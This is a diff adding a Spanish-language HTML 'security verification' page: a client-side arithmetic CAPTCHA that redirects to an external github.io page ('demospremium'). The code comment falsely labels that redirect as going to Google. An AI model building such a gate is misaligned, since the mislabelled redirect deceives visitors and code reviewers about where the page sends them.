@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .captcha-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        h2 {
+            margin-top: 0;
+            color: #333;
+            font-size: 20px;
+        }
+        p {
+            color: #666;
+            font-size: 14px;
+        }
+        .challenge-box {
+            background-color: #e9ecef;
+            padding: 15px;
+            border-radius: 5px;
+            font-size: 24px;
+            font-weight: bold;
+            letter-spacing: 3px;
+            color: #2c3e50;
+            margin: 15px 0;
+            user-select: none; /* Evita que copien y peguen el texto */
+        }
+        input[type="number"] {
+            width: 80%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        button {
+            background-color: #4285F4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #357ae8;
+        }
+        .error-msg {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="captcha-container">
+    <h2>Verificación Humana</h2>
+    <p>Resuelve la siguiente suma para continuar:</p>
+    
+    <div class="challenge-box" id="captcha-question"></div>
+    
+    <form id="captcha-form">
+        <input type="number" id="captcha-answer" placeholder="Tu respuesta" required>
+        <button type="submit">Verificar&Generar</button>
+    </form>
+    
+    <div class="error-msg" id="error-message">Respuesta incorrecta. Intenta de nuevo.</div>
+</div>
+
+<script>
+    let correctAnswer;
+
+    // Función para generar dos números aleatorios y crear la suma
+    function generateCaptcha() {
+        const num1 = Math.floor(Math.random() * 10) + 1;
+        const num2 = Math.floor(Math.random() * 10) + 1;
+        correctAnswer = num1 + num2;
+        document.getElementById('captcha-question').textContent = `${num1} + ${num2} = ?`;
+        document.getElementById('captcha-answer').value = '';
+    }
+
+    // Validar el formulario al enviarlo
+    document.getElementById('captcha-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Evita que la página se recargue sola
+        
+        const userAnswer = parseInt(document.getElementById('captcha-answer').value, 10);
+        const errorMsg = document.getElementById('error-message');
+
+        if (userAnswer === correctAnswer) {
+            errorMsg.style.display = 'none';
+            // Redirección a Google
+            window.location.href = 'https://goreproductortvhd-debug.github.io/demospremium/index2.html';
+        } else {
+            errorMsg.style.display = 'block';
+            generateCaptcha(); // Genera un nuevo reto si falla
+        }
+    });
+
+    // Generar el primer CAPTCHA al cargar la página
+    generateCaptcha();
+</script>
+
+</body>
+</html>
